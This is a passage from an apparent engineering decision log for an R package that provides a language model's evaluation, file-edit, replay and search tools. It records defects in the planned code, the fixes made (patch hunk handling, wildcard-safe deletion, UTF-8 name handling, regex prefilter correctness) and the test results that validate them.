   `try(suppressWarnings(...), silent = TRUE)`, so a vector R rejects (wrong length, not
   integer, an NA or invalid kind) never turns into an error or warning at the end of an agent's
   evaluation. R checks such a vector again at the user's next draw, as without the swap.
   `RNGkind()`, `set.seed()`, `sample()` and `runif()` stay unused (IC-61).
2. **The word 2^31 is stored as `NA_integer_` without a warning.** The plan turned a reduced
   word of exactly 2147483648 into `-2147483648`, and `as.integer()` made it NA with the warning
   "NAs introduced by coercion to integer range" (about 6 chances in 2^32 per key). NA is that
   word's two's-complement bit pattern, R reads it back as 2^31, and a seed with NA words gives
   reproducible draws. `rng_seeds()` now sets that value to NA before `as.integer()`.

Validation: `progress/P09.md`, Task 7. Six blocks (22 expectations) were added to the plan's 4
blocks (17). Review round 1 added two blocks (11 expectations): the kind with a seed failed 2
against the round-0 source (`task7-fix1-red.log`), and a mutant that re-syncs without `try()`
and `suppressWarnings()` fails the rejected-vector block (`task7-fix1-mutant-notry.log`). Final
`^eval-core$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 50 ]` (`task7-fix1-green.log`).

## D-053 - P10 edit engine: whole-line patch hunks, one operation per file, Codex's hunk-line rule, a checked Delete File, fuzzy envelopes carry the diff, a lone CR stays out of the diff, a NUL means binary, string fields, the shim finds envelopes and never reads a named file, linear match search (2026-10-04)

P10 Task 6's plan-literal `R/tool-edit.R` passes the plan's 15 blocks (79 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task6-probe-plan-literal.log`
and `-clocale.log`; the plan-literal file is kept as `task6-plan-literal-tool-edit.R`, the probe as
`task6-probe.R`). Signatures and result shapes are the plan's (04 section 7.10):
1. **A patch hunk that only removed lines left an empty line.** Each hunk became an
   `oldText`/`newText` pair of its joined lines without a line ending, so `@@ / -y = 2` turned
   `x = 1\ny = 2\nz = 3\n` into `x = 1\n\nz = 3\n` (CRLF and fuzzy variants alike). Codex hunks
   are blocks of whole lines. Such a hunk (no context, nothing added) now also removes the line
   ending after the block when the block starts a line and ends one (the LF view first, then its
   fuzzy normalisation, as `apply_edits()` searches), or the ending before it when the block ends
   a file without a final newline. A block found only inside a line keeps the plan's substring
   semantics, and the uniqueness check still runs on the widened text.
2. **A file named by two operations lost a change, or was deleted.** Every operation is computed
   against the original files, so two `*** Update File` sections of one file wrote only the
   second update (reported as 2 files changed), an update plus a delete of one file deleted it,
   a move onto another operation's file raced it, and on a case-insensitive file system
   `Update case.R / Move to CASE.R` wrote the file and then removed it under its old name,
   leaving nothing. `patch_apply()` now refuses, before computing anything, a patch in which two
   operations name one file (`Invalid patch: more than one operation names <path>; put all
   hunks of a file under one *** Update File.`); paths are compared by `patch_key()` (item 15).
   A move removes the name it moved (a link itself), not the link's target: the plan deleted the
   target and left a dangling link. Whether the old name is the file just written is asked of the
   file system (item 13).
3. **Hunk lines follow Codex's rule.** A line of an update hunk must start with " ", "-" or "+"
   (an empty line is empty context); the plan dropped the first character of any other line and
   used the rest as context. Such a line, and an `*** Update File` without hunks (also with only
   a `*** Move to`), are now `Invalid patch: ...` errors; the plan reported the latter as `Edit
   tool input is invalid. edits must contain at least one replacement.`
4. **`*** Delete File` is checked.** The plan's `file.remove()` deleted an empty directory and
   ignored a failed removal. A directory is refused before anything is written (`Could not delete
   file: <path>. Error code: EISDIR.`); a removal goes through `unlink(expand = FALSE)` (which
   never removes a directory and never reads the name as a pattern, item 12) and a failure is
   `gptr_error_doc_write`. An `*** Add File` without content lines
   writes an empty file (the plan wrote one newline).
5. **An envelope whose hunk matched only through the fuzzy fallback reported no deviation.**
   `edit_from_patch()` set `fuzzy = FALSE`, `deviated = FALSE` and an empty `diff`, so the result
   text never carried the diff that contract section 9.2 and acceptance 6 require when the fuzzy
   fallback, an EOL change or a re-encoding changed what was asked. `patch_apply()`'s details now
   add `fuzzy` and `reasons` (from the same `edit_reasons()` that `edit_file()` uses), and
   `edit_from_patch()` returns them with `diff` = the patch's unified diff cut to 400 tokens.
6. **A lone CR produced a spurious diff.** The bytes were kept, but the after-view of the diff
   turned a lone CR into a line break while the before-view kept it, so `a\rb\nc\n` edited at
   `c` showed three changed lines. Both views now read only CRLF as LF.
7. **A UTF-8 BOM file with a NUL byte past the first 8,000 bytes** failed with `decode_raw()`'s
   `The file contains NUL bytes: it is binary.` instead of the edit text `Could not edit file:
   <path>. It is a binary file.`; a UTF-8 BOM no longer exempts a file from the NUL check (only
   UTF-16/32 BOMs do).
8. **An `oldText`/`newText` that is not one string** (a number, `NA`, a vector) stopped with a
   base R `vapply()` or `gregexpr()` error. Pi's shim now refuses it with
   `gptr_error_invalid_argument`: `Edit tool input is invalid. edits[<i>].<field> must be a
   string.` (fields absent or `NULL` keep the plan's defaults).
9. **The shim never saw an envelope inside other edit shapes.** An envelope pasted as the only
   edit's `newText` inside a JSON-string `edits` (the shape Pi's shim exists for), a single
   object or a data frame failed with `oldText must not be empty`. `edit_envelope_of()` (and so
   `edit_nested_input()`) now puts `edits` through the shim first, and returns the envelope
   string when the field is a one-element list.
10. **A string naming a file or a URL was read as the edits.** `jsonlite::fromJSON()` treats a
    string that is not valid JSON as a file name or an http(s) URL (jsonlite 2.0.0 opens
    `file()` or `url()` on it), so a model-supplied `edits` naming a local JSON file applied that
    file's edits, and a URL would have been fetched. The shim uses P01's `json_decode()`
    (`jsonlite::parse_json()`, the same `simplifyVector = FALSE` semantics as conventions
    section 6, written for exactly this reason in P01).
11. **Match search was quadratic in the number of matches.** `gregexpr(fixed = TRUE)` took 9 s
    for 200,000 matches in a 5 MB text (a `replace_all`, or the uniqueness count of a short
    `oldText` in a large file). `fixed_positions()` now uses `strsplit()` and byte counts (0.03
    s, same positions: leftmost, non-overlapping).

Independent review round 1 (each reproduced, then a regression test written and seen red):
12. **A deleted or moved name was read as a wildcard pattern.** `unlink()` expands `*`, `?` and
    `[...]` by default, so `*** Delete File: [abc].R` deleted `a.R` and `b.R`, kept `[abc].R` and
    then failed, `*** Delete File: *.R` deleted every `.R` file, and moving `x?.R` also deleted
    `xy.R`. `patch_remove()` calls `unlink(p, expand = FALSE)`. (The plan's `file.remove()` never
    expanded, but removed empty directories, item 4.)
13. **A move onto the same file spelled differently deleted it.** Item 2 compared the old and new
    names as strings (only a final link followed, only ASCII case folded), so on APFS `ete.R ->
    ETE.R` with accented letters, an NFC -> NFD rename and `a.R -> L/a.R` (`L` a link to the
    directory) wrote the file and then removed its only copy. `patch_finish_move()` now asks the
    file system after the write: an old name that is still a link is another entry and only the
    link is removed; an old name that now reads as the bytes just written is the same entry and
    is renamed to the new spelling (so a case-only rename takes effect; before, the name kept its
    old case); any other old name is removed. A move to a link of the old file replaces the link
    and removes the old name. A rename-first move was not used: when the old name is a link to
    the new name, `rename()` puts a link to itself in place of the file before the write, and a
    move across devices needs the write-then-remove path anyway.
14. **An `oldText` of only whitespace matched between every two characters.** Fuzzy normalisation
    makes it empty, and the empty needle matched at every byte: with `replace_all`, `\t -> X` on
    `ab\ncd\n` wrote `aXbX\nXcd\nab\ncXdX\n`; without it the error was `Found 5 occurrences`,
    and a unique exact tab could not be edited at all (the uniqueness count found an empty match
    per byte). `fixed_positions()` returns no position for an empty needle, so such an edit fails
    with Pi's `Could not find ...` text. The plan-literal source has the same defect.
15. **Two operations on one file through a directory link or a folded name were not refused.**
    `patch_key()` builds the key from the link target with its existing part resolved by
    `normalizePath()` (directory links followed; the stored spelling on macOS and Windows) and, on
    a case-insensitive file system, folds the whole key (Unicode lower case and NFC through
    stringi, ASCII case without it). `L/a.R` + `D/a.R`, a non-ASCII case pair, an NFC/NFD pair and
    two `*** Add File` names that differ only in case are refused. Limitation: names not created
    yet are compared exactly on a case-sensitive file system, also on a normalisation-insensitive
    one (APFS case-sensitive).
16. **A last line removed through the fuzzy view left its trailing whitespace behind.** For `x =
    1\ny = 2   ` (no final newline), the hunk `-y = 2` became `\ny = 2`, which also matches
    exactly at the start of the last line, so the result was `x = 1   `. A block found at the end
    of the fuzzy view only is now widened from the file's own last lines; the line before keeps
    its bytes.
17. **A move onto an existing directory** failed with a base R connection error after the earlier
    operations were written (found while verifying item 13). It is refused before anything is
    written: `Could not move file: <path> to <dest>. Error code: EISDIR.`

Internal additions: `edit_source()` (the loading half of the plan's `edit_compute()`, which now
takes an optional `src`), `edit_view()`, `edit_reasons()`, `patch_line_end()`,
`patch_hunk_edits()`, `patch_remove()`, `patch_key()`, `patch_finish_move()`.

Validation: `progress/P10.md`, Task 6. Eleven blocks (53 expectations) were added to the plan's
15 blocks, which are unchanged. Against the plan-literal source the implementer's test file gives
`[ FAIL 32 | WARN 1 | SKIP 0 | PASS 88 ]` (`task6-red-plan-literal.log`; every failure is in an
added block). Implementation green: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 132 ]` in the UTF-8 and the
C locale (`task6-green-final.log`, `task6-green-clocale.log`). Review round 1 added 4 blocks and 4
expectations in 2 added blocks (30 expectations in all). Against the pre-fix source the final
test file gives `[ FAIL 17 | WARN 5 | SKIP 0 | PASS 126 ]`, every failure in those 30
(`task6-fix1-red-final.log`). Final `^tool-edit$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 162 ]` in
both locales (`task6-fix1-green.log`, `task6-fix1-green-clocale.log`).

## D-054 - P09 evaluator: TEMPORARY skip of the gptr-shim test until P08 adds gptr_return(); P08 Task 10 MUST remove it (2026-10-04; CLOSED 2026-10-05 by P08 Task 10)

P09 Task 8 runs in an early lane, before P08. One plan test needs P08's exported
`gptr_return()`: "the gptr shim reaches gptr:: when gptr is not visible from envir"
(`tests/testthat/test-eval-core.R`). It evaluates `r = gptr_return(5)` in a
`new.env(parent = baseenv())` home, so it needs a real `gptr::gptr_return`. Coordinator decision
for the sequencing: that one test gets the guard
`skip_if_not(exists("gptr_return", envir = asNamespace("gptr"), inherits = FALSE), ...)` and its
body stays verbatim. `gptr_return()` is not stubbed. The shim itself (`gptr_shim()`, Task 1)
is implemented and unit-tested in `test-eval-guard.R`.

**The guard is TEMPORARY.** P08 Task 10 ("The session SDK verbs"), which adds `gptr_return()`,
MUST delete the two comment lines and the two-line `skip_if_not()` call at the top of that
block, then show the test passing (2 expectations) in its evidence. Until then `^eval-core$`
reports `SKIP 1`. Tracked in `HANDOFF.md` (cross-plan obligations) and `progress/P09.md`
("Pending removal").

**Closed (2026-10-05, P08 Task 10).** The two comment lines and the `skip_if_not()` call are
deleted; the body is unchanged. The test needs `gptr::gptr_return` to be a real export: under
`devtools::test()` pkgload's `load_all()` exposes every object in the package environment but
`::` still reads the NAMESPACE exports, so without `export(gptr_return)` the evaluation ended in
status `error` ("'gptr_return' is not an exported object from 'namespace:gptr'";
`dev/.validation/P08/task10-d054-eval-core-red-without-export.log`, `[ FAIL 2 | WARN 0 | SKIP 0 |
PASS 231 ]`). P08 Task 10 therefore takes `export(gptr_return)` and `man/gptr_return.Rd` now
(D-123 item 3). `^eval-core$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 233 ]`, the shim test with its
2 expectations (`dev/.validation/P08/task10-d054-eval-core-counts.log`).

## D-055 - P09 evaluator: session changes are taken before gptr renders the plots; added promises and active bindings show their kind; non-ASCII and invalid names never make eval_r() throw; code that is not valid UTF-8 is a parse error; a message sink the code leaves open is undone; values print with the home's print methods (2026-10-04)

P09 Task 8's plan-literal `eval_r()` helpers (`R/eval-core.R`) and Task 2's `env_diff()`
(`R/env-snapshot.R`) were changed in the six ways below. Items 1-4 were found by a probe of the
plan-literal source (`dev/.validation/P09/task8-eval-core-plan-literal.R`), items 5 and 6 by
review round 1 and refined in review round 2. The signatures of `eval_r()` and `env_diff()`, the `gptr_eval_result` fields,
the statuses, the event types and the plan's 24 test blocks (19 in `test-eval-core.R`, 5 in
`test-copy-eval.R`) are unchanged.

1. **Session changes are compared before the plots are rendered.** Rendering to PNG is gptr's
   own work. The first plot of a process loads ragg, systemfonts and textshaping, and the plan
   reported them as `changes$loaded`, which tells the model its code loaded them. This holds for
   every first `r` call that plots. `eval_finish()` now stores `eval_session_state()` in
   `st$state1` after `eval_restore()` and before `eval_plots_done()`, and `eval_result()` uses
   it. Where nothing ran (blocked, parse error) it falls back to a fresh state. The `TZDIR`
   rule is kept, because the evaluated code can format a time too.
2. **An added promise or active binding shows its kind.** `delayedAssign()` and
   `makeActiveBinding()` gave `+ p <NA NA>`, because the snapshot has no class or shape for
   bindings it never forces. They are now `+ p <promise>` and `+ ab <active>`, as the `~`
   lines already did, and the binding stays unforced.
3. **Non-ASCII and invalid object names never make `eval_r()` throw.** `ls()` returns a name
   parsed from code, such as `donn<e9>es = 1:3`, with unknown encoding. R's radix sort refuses
   such a string ("Character encoding must be UTF-8, Latin-1 or bytes"), so `env_diff()` threw
   after the code had run, and the result was lost (04 section 2.2: evaluation failures never
   throw). `env_diff()` now orders the exact names by their display text, `env_text()`, still
   with `method = "radix"`. The `+`/`~`/`-` lines pass names, classes and shapes through
   `env_text()`, so a name that is not valid UTF-8 shows as `a<ff>` and the lines are valid
   UTF-8 (IC-62; D-040 item 2). R makes the check on the first key only, when it is a
   character vector, and looks at its first element (probe on R 4.5.0 with the unknown-encoded
   `x = c("<e4>ndern", "b")`: `order(x)` and `order(x, c(1, 2))` throw, `order(rev(x))` and
   `order(c(1, 1), x)` do not). `workspace_lines()` orders by
   `order(-size, snapshot$name, method = "radix")`, whose first key is numeric; with the names
   `<e4>ndern` alone and with `b` it returned the lines without an error, so it is unchanged.
4. **Code that is not valid UTF-8 after `as_utf8()` is a `parse_error`.** The plan's `gsub()`
   threw "input string 1 is invalid" (with a translation warning) before parsing. Model code
   arrives as JSON and is always valid, but `!expr` and `ctx$eval()` callers can pass bytes.
   `eval_parse()` now returns the error `<gptr>: the code is not valid UTF-8 text; nothing was
   evaluated.` and nothing runs. In a non-UTF-8 locale `as_utf8()` reads such bytes as native
   text, so this cannot happen there.
5. **A message sink the code leaves open is undone.** The plan restores only output sinks
   (those at or above its own). `eval_r()` stops at the first error, so code such as
   `sink(zz, type = "message"); library(x); sink(type = "message")` never reaches its reset
   line when `library(x)` fails, and the user's later errors, warnings and messages went into
   the code's file for the rest of the session. `eval_open()` now notes
   `sink.number(type = "message")` in `st$msg_sink`. When it differs at the restore,
   `eval_msg_sink_reset()` resets messages to stderr and, when the user had a message sink of
   their own, points them back to that connection while it is still open. The code's
   connection is its own object in the home and stays open. `eval_restore()` resets the
   message sink before it closes the capture connection (review round 2): while output is
   captured, `stdout()` is that connection, so `sink(stdout(), type = "message")` points
   messages at it, and the plan's `close(st$con)` then threw "cannot close 'message' sink
   connection" out of `eval_r()` (04 section 2.2), with `st$restored` already set, so the
   options, the `askYesNo` trap, the plot device and the message sink stayed changed and the
   user's later messages and errors went into an anonymous file. The close is now wrapped in
   `tryCatch()`, so no restore step can skip the ones after it. A capture connection that
   `eval_read_sink()` reopened, after the code closed both it and the user's message sink
   connection, can take the user's connection number; `eval_msg_sink_reset()` never points
   messages at it and falls back to stderr.
6. **A visible value prints with the print methods visible from the home.** The plan's
   `eval_print()` called `print(value)` from the gptr namespace, so S3 methods were looked up
   from there (globalenv() and the search path). A method that the code defined in another home
   (a function frame, the plan-mode scratch overlay, an inline sub-agent overlay) printed `x`,
   which 04 prints as `print(<sym>)` in the home, but not `(x)` or `f(x)`. `eval_print()` now
   does what R's console does (`PrintValueEnv()`): for an object or a function it evaluates
   `print(x)` in a short-lived child of the home, with `x` bound to the value. Other values
   print as in the plan, with `print(value)`, as the console prints them without dispatch
   (review round 2): binding the empty symbol, which `formals(f)$a` or `alist(a = )$a` returns
   for an argument without a default, to `x` made `print(x)` fail with 'argument "x" is
   missing', so the evaluation stopped with status `error` where the console prints a blank
   line. S4 objects still go through `show()`. Before
   it returns, the binding is removed and the child is detached (`parent.env(pe) =
   emptyenv()`). A child left pointing at a function-frame home counts as a reference to the
   frame, so R keeps the frame's arguments referenced after the function returns, and the
   user's next edit copies them: without the detach, the plan's two function-frame copy rows
   and the added one each counted 1 copy (`task8-fix1-mutant-nodetach.log`).

Validation: `progress/P09.md`, Task 8. For items 1-4, four blocks were added to
`test-eval-core.R` (23 expectations) and one to `test-env-snapshot.R` (5). Against the
plan-literal sources they give `[ FAIL 5 | WARN 0 | SKIP 1 | PASS 220 ]` for
`^(eval-core|env-snapshot)$` (`task8-red-adaptations.log`). For items 5 and 6 (review round 1),
two blocks were added to `test-eval-core.R` (20 expectations) and one block of two rows to
`test-copy-eval.R`. Against the round-0 source, `^(eval-core|copy-eval)$` gives
`[ FAIL 8 | WARN 0 | SKIP 1 | PASS 204 ]` (`task8-fix1-red.log`). For review round 2, one
block was added to `test-eval-core.R` (37 expectations) and 4 expectations to the print block.
Against the round-1 source, `^eval-core$` gives `[ FAIL 35 | WARN 0 | SKIP 1 | PASS 192 ]`
(`task8-fix2-red.log`); the reused-number check alone, against the reordered restore, gives
`[ FAIL 2 | WARN 0 | SKIP 1 | PASS 229 ]` (`task8-fix2-red-slot.log`). Final
`^(eval-core|copy-eval|env-snapshot)$`: `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 325 ]`
(`task8-fix2-green.log`). Under `LC_ALL=C`, the three UTF-8-only blocks skip, and
`^(eval-core|env-snapshot)$` gives `[ FAIL 0 | WARN 0 | SKIP 4 | PASS 283 ]`
(`task8-fix2-green-clocale.log`).

## D-056 - P06 replay functions: header ids, value= names, models and document fields are checked first, doc is optional, a reconstruction is all or nothing, a header turn is one whole number, a session rebuilt for a replay takes model, mode and frozen prompt from the cut path, a reconstructed history stays reconstructed when rebuilt from its file (2026-10-04)

P06 Task 14's literal `session_replay_apply()` and `session_replay_new()` are changed in six
ways. P15's replay (the `document` route of IC-45/IC-46) and P19's team replay consume them:

1. **The header fields that name things are checked before anything is looked up or recorded.**
   `header$session` must pass `check_session_id()` (Task 3, D-050 item 2), `header$value` must
   be one non-empty string, and `header$model` one non-empty string whose parts before and after
   its first `/` are both non-empty (04 section 11.5 records `provider/id`; a name without `/`
   is kept as given, as `model_canonical()` keeps it); otherwise `gptr_error_invalid_argument`
   with `arg = "header$session"`, `"header$value"` or `"header$model"`. In the plan a non-string
   or two-element id raised base R's unclassed `get0()` error in `session_by_id()`, a path-like id
   was refused only by `session_new()` (`arg = "opts$id"`), a bad `value=` reached `exists()`
   after the `gptr.replay` entry had been appended, and a model such as `"fake/"` or `"/x"` was
   refused by P01's `msg_assistant()` (`arg = "model"`) after the session had been registered
   and its user message written to its file (review round 1).
2. **`doc` defaults to `NULL`, its fields are checked, and a reconstruction is all or nothing.**
   IC-46 (section 15) calls `session_replay_new(block, header, envir)`; 04 section 7.6 lists `doc`
   as a fourth argument. The default satisfies both. `path`, `format`, `template` and `text` must
   be one string or `NULL`, `code` and `output` character vectors without NA. In the plan a
   two-element template became the joined prompt `"a\nb"`, and `text = 1` failed in P01's
   `as_content()` after the session had been registered under the recorded id, so the next replay
   of that id returned the half-built session. Any other failure after the session is created (a
   store error, an interrupt) is now undone as `store_rebuild()` undoes a rebuild: an `on.exit()`
   in `session_replay_new()` (`replay_undo()`) forgets the live session, restores the last
   session, releases the lock and removes the file this call created (a file that already existed
   when the store opened is kept), so neither this process nor a later one finds a half-built
   transcript under the recorded id; the condition propagates unchanged (review round 1). The
   plan's `replay_reconstruct(header, envir, doc)` is split into `replay_session_new(header,
   envir)` and `replay_reconstruct(s, header, doc)` for this, and the adoption of the block
   (`kind`, `block`, `doc`, `replay_mark()`) moved into `replay_adopt()`. A session rebuilt for a
   replay relies on `store_rebuild()`'s own all-or-nothing up to the rebuilt session (contract
   note in `progress/P06.md`).
3. **A header turn is one whole number >= 0, else unknown** (`replay_turn()`). The plan's
   `as.integer()` truncated `"1.5"` and failed with "the condition has length > 1" for a
   two-element turn, after the session was registered. An unknown turn means no cut for a rebuilt
   session and turn 1 for a reconstruction (the plan's default); a reconstruction is at least
   turn 1, since it always holds a user message.
4. **A session rebuilt for a replay takes its model, mode and frozen prompt from the cut path.**
   The plan moved the leaf back to the recorded turn and re-derived the turn, last answer, values
   and status, but kept what `store_rebuild()` had read from the full path. A model change, a mode
   change (to `auto`, for instance) or an IC-52 refreeze inside a later turn then decided how the
   replayed session continued. `replay_rebuild()` now re-reads them with Task 13's
   `rebuild_model()`, `rebuild_mode()` and `rebuild_frozen()`, the rule of D-050 item 3 (the
   frozen prompt only when the file is not foreign, whose `refreeze` stays set).
5. **A reconstructed answer that was not recorded does not point to absent code.** The plan's
   placeholder said "its code is above" even when no code was recorded; that clause is now added
   only when the `r` call is reconstructed. `last_text` stays `NA` (plan).
6. **A history reconstructed from a document stays reconstructed when its file is rebuilt.**
   A reconstruction writes its JSONL under the recorded id, so a later process (or this one after
   the session was collected) rebuilds it from that file, and the plan's `history_source` was then
   `"store"`: the IC-46 notice of a later live continuation was never given, although the
   transcript is the same approximate one. `store_rebuild()` (Task 13's `rebuild_fill()`, so
   `gptr_resume()` too) and `replay_rebuild()` (from the cut path) now set `history_source` with
   `history_source_of()`: `"reconstructed"` when the path holds a message only a reconstruction
   writes (a user message with source `replay`, or an assistant message with api `replay`, which
   a foreign rebuild's `imported` marking leaves intact), else `"store"` (review round 1).

Validation: `progress/P06.md`, Task 14 (`test-session-object.R`). Four blocks (45 expectations)
were added to the plan's eight, and three more (34 expectations) in review round 1. Against the
plan-literal source the first four gave 13 failures and 399 passes, all failures in the added
blocks (`task14-literal.log`); the round-1 blocks gave 11 failures against the first
implementation (`task14-fix1-red.log`). Final `^session-object$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 463 ]` in the UTF-8 and the C locale (`task14-fix1-green.log`,
`task14-fix1-green-C.log`).

## D-057 - P10 grep, find and ls: a searched file and the relevance sort work with non-ASCII names in a C locale, the whole-file prefilter never drops a matching file, ls skips names that are not valid UTF-8, a failed long-line locate leaks no warning, a match-limit failure is always reported and costs only its own lines, a skipped file over 20 MB is always reported (2026-10-04)

P10 Task 7's plan-literal `R/tool-search.R` passes the plan's 13 blocks (56 expectations, the
ripgrep oracle included) in the UTF-8 and the C locale, and its (file, line) sets equal
ripgrep's on 8 patterns over `R/`, `tests/` and `dev/spec/` (`dev/.validation/P10/task7-probe-rg-repo.log`).
One defect, reproduced against that source (`task7-probe-plan-literal-clocale.log`,
`task7-probe2-plan-literal-clocale.log`); review round 1 found three more (items 2-4,
`task7-fix1-probe*-before.log`), review round 2 two more (item 2's backreferences and item 5,
`task7-fix2-probe1-before.log`) and review round 3 two more (item 2's skipped pattern text and
item 6, `task7-review3-probe-possessive.log`, `task7-review3-probe-bigfile.log`). Item 3 adds the
`invalid_names` attribute of `search_ls()`, item 5 adds the "results may be incomplete" notice to
the texts and prints that had none, and item 6 adds the plan's skipped-file notice where it was
missing. No signature, class, column or other Pi text changes.
1. **`basename()` of a marked UTF-8 non-ASCII path stops in a non-UTF-8 locale** ("unable to
   translate ... to native encoding"; the base-R limit behind D-041 item 4 and D-051 item 6). Two
   plan calls hit it. `grep_candidates()` labelled a single searched file with `basename(root)`,
   so `search_grep("x", "<dir>/café.R")` failed; `find_relevance()` took `basename(paths)`, so
   `search_find(sort = "relevance")` failed as soon as the walk met one non-ASCII name anywhere
   under the root. Both now use the new `search_basename()` (`sub("(?s)^.*/", "", p, perl =
   TRUE)`, marked with `as_utf8()`); the paths are already "/"-separated (`resolve_tool_path()`,
   `walk_files()`).
2. **The whole-file `(?m)` prefilter dropped matching files** (report 21 section 2.1; report 11
   section 2.5, the same (file, line) sets as ripgrep). It must keep every file the per-line
   matcher matches, but the plan switched it off only for `\A`, `\z`, `\Z`, `\G`, a leading verb
   and an `(?s)` flag. At a line edge the per-line subject has no neighbour while the whole file
   has "\n", so these constructs failed in the whole file where the line matched: negative
   lookaround (`,(?!\s)` on a line ending with a comma, `(?<!\s)#` at a line start, `(*nla:`),
   possessive quantifiers and atomic groups (`a\s*+$` and `a(?>\s*)$` consume the newline and
   cannot give it back), conditionals (`q(?(?=\s)x|)$`), a verb after the start (`x(*COMMIT)y`
   ends the scan at the file's first `x`), and an inline `(?-m)` or `(?^)` (they unset the
   prefilter's multiline flag). The file was dropped before the per-line matcher ran, so its
   matches were lost without a notice, and whether a line was reported depended on unrelated
   lines. `rg -P` and the per-line matcher report every one of them. The prefilter is now also
   off for `(*` anywhere, `(?!`, `(?<!`, `(?>`, `(?(`, an option group containing `-` or `^`,
   and a possessive quantifier (`*+`, `++`, `?+`, `}+`). Over-matching, inside `\Q...\E` or on an
   escaped `\*+`, only costs the prefilter's speed. 22 common patterns keep the prefilter
   (`task7-fix1-probe4-prefilter-active.log`), and the ripgrep comparison over `R/`, `tests/`
   and `dev/spec/` is unchanged (`task7-fix1-probe-rg-repo.log`). Review round 2: a capture made
   inside a positive lookaround is atomic too, so a backreference to it (`a(?=(\s*))\1$`, the
   atomic-group idiom) lost `ws.R:1` the same way (`rg -P` reports it). Backreferences (`\1`-`\9`,
   `\g`, `\k`, `(?P=`) now switch the prefilter off. The possessive test now reads `}+` only after
   a quantifier brace (`{n}`, `{n,m}`, `{,m}`), so `\p{L}+`, `\x{E9}+` and `\N{U+00E9}+` keep the
   prefilter (`task7-fix2-probe4.log`). Review round 3: PCRE2 looks for the possessive `+` only
   after skipping `\Q`, `\E`, `(?#...)` comments and, under an `x` or `xx` option, white space and
   `#` comments. So `a\s*\E+$`, `a\s*\Q\E+$`, `a\s*(?#c)+$`, `(?x:a\s* +$)`, `(?ix)A\s* +$` and
   `(?xx)a\s* +$` were possessive although the test saw no `*+`, and lost `ws.R:1` (`rg -P`
   reports it; `task7-review3-probe-possessive.log`). The prefilter is now also off for `\Q`,
   `\E`, `(?#` and an option group containing `x`. An option setting or a callout between a
   quantifier and `+` is a compile error, so PCRE2 skips nothing else there
   (`task7-fix3-probe1-after.log`). A `fixed = TRUE, ignore_case = TRUE` pattern, which reaches
   PCRE as `\Q...\E`, is literal: the test now skips it, so it keeps the prefilter, even with
   `*+` or `\E` in its text (`task7-fix3-probe2.log`). The round-3 probe shows no dropped file
   after the fix (`task7-fix3-probe-possessive-after.log`), and the ripgrep comparison over `R/`,
   `tests/` and `dev/spec/` still agrees on every non-empty row (`task7-fix3-probe-rg-repo.log`).
3. **`search_ls()` listed with `list.files()` directly**, bypassing D-041 item 7. A name that
   is not valid UTF-8 (Latin-1 bytes on Linux in a UTF-8 locale) reached `tolower()` in the name
   sort, which threw "invalid input ... in 'utf8towcs'", so `ls` failed for the whole
   directory. It now lists through the walker's `walk_list_dir()`, skips such names before
   `as_utf8()` and counts them in a new `invalid_names` attribute, as `walk_files()` does.
   `search_find()` already carried the walker's count. The Pi texts are unchanged.
4. **The long-line locator leaked PCRE warnings** (report 11 section 7.1 risk 3).
   `grep_cap_lines()` runs the pattern again on a line longer than 500 characters to centre the
   window. That `regexpr()` was outside the warning handler, so a match-limit error on such a
   line leaked "PCRE error 'match limit exceeded'" from `grep_tool_text()` and `print()`.
   This happened even for a context line, and although `search_grep()` had already recorded
   `incomplete`. The locator now runs under `suppressWarnings()`; a failed locate gives -1 and
   the window starts at the beginning of the line.
5. **A PCRE match-limit failure was not always reported, and in the prefilter it lost whole
   files** (report 11 section 7.1 risk 3; the plan's "captured and reported as 'results may be
   incomplete'"). `grep_tool_text()` and `print.gptr_matches()` returned "No matches found"
   before building any notice, and `print.gptr_files()` had no incomplete note, so a search
   whose only candidate lines hit the limit read as a clean empty result. Worse, the whole-file
   `(?m)` prefilter returns `FALSE` for a file on which it hits the limit, so every line of that
   file was dropped, including lines the per-line matcher matches cheaply. `(a+)+$` over
   `cat.txt` = 600 `a`, `b`, then `aaa` gave "No matches found" with no notice (`rg -P` reports
   "match limit exceeded" for the file); `((a|\s)+)+b` over twelve `aaaa` lines, `x` and `aab`
   lost `f.txt:14` (`rg -P` finds it) and claimed `incomplete`, although no line hits the limit.
   The empty texts and both prints now carry the notice when `incomplete` is set. When the
   prefilter warns for a batch, each file of the batch is tried alone, and only the files that
   hit the limit go to the per-line matcher; the prefilter's own failure no longer sets
   `incomplete`, which now records only lines that hit the limit themselves. The reviewer's
   sketch sent the whole batch on. It was not used because it also scans every non-matching file
   of the batch line by line; the added prefilter check fails against it
   (`task7-fix2-red-batch.log`). Over three `R/` files, `(\w+\s?)+$` now finds the per-line
   matcher's 258 rows instead of 240, in 9.3 s instead of 7.9 s; the per-line matcher alone
   takes 9.8 s (`task7-fix2-probe3.log`).
6. **A file larger than 20 MB was skipped without its notice unless rows remained** (the plan's
   "Files larger than 20 MB are skipped with a notice"; review round 3). `grep_tool_text()`
   returned "No matches found" before it built the note, and `print.gptr_matches()` and
   `print.gptr_files()` never showed `skipped_big`. Model code in `r` sees results through these
   prints (`gptr$grep()`), so a skipped file went unreported there
   (`task7-review3-probe-bigfile.log`). The new `search_skipped_note()`, next to
   `search_incomplete_note()`, gives "<n> file(s) larger than 20MB skipped" to the direct text and
   to both prints, with or without rows, before the incomplete note. `search_find()` and
   `search_ls()` results carry no `skipped_big` and print no note
   (`task7-fix3-probe-bigfile-after.log`).

Validation: `progress/P10.md`, Task 7. Added block "non-ASCII file and directory names are
searched, found and listed in any locale" (7 expectations, under
`withr::local_locale(c(LC_CTYPE = "C"))`). Against the plan-literal source:
`[ FAIL 1 | WARN 0 | SKIP 0 | PASS 57 ]`, the block erroring at `basename(root)`; with only the
first fix `[ FAIL 1 | WARN 0 | SKIP 0 | PASS 58 ]`, erroring at `basename(paths)`
(`task7-red-final-plan-literal.log`, `task7-red-final-relevance.log`). Items 2-4 add the
blocks "the whole-file prefilter never drops a file the per-line matcher matches" (14
expectations), "ls skips and counts an entry whose name is not valid UTF-8, as the walker does"
(4) and "a match-limit error while placing a long line's window leaks no warning" (6). The
final test file against the reviewed source (scratch copy, working tree untouched):
